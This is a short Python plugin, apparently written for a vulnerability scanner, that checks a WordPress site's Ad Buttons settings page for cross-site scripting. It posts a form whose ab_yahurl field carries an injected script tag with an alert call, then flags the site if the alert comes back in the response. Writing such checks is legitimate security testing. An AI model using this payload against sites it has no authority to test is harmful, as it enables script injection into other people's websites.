#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'ifk'


def assign(service, arg):
    if service == "wordpress":
        return True, arg


def audit(arg):
    url = 'wp-admin/admin.php?page=ad-buttons-settings'
    payload = 'ab_dspcnt=1&ab_title=&ab_target=bnk&ab_powered=1&ab_count=1&ab_yaht=pag&ab_yourad=44&ab_yahurl=%22%3E%3E%3Cscript%3E%2B-%2B-1-%2B-%2Balert%28ifk%29%3C%2Fscript%3E&ab_adsense_fixed=1&ab_adsense_pos=1&ab_adsense_pubid=pub-&ab_adsense_channel=&ab_adsense_corners=rc%3A0&ab_adsense_col_border=%23&ab_adsense_col_title=%23&ab_adsense_col_bg=%23&ab_adsense_col_txt=%23&ab_adsense_col_url=%23&ab_width=%3Cimg&ab_padding=%3Cimg&Submit=Save+Changes'
    verify_url = arg + url
    code, head, res, _, _ = curl.curl('-d %s %s' % (payload, verify_url))
    if code == 200 and 'alert(ifk)' in res:
        security_warning(verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])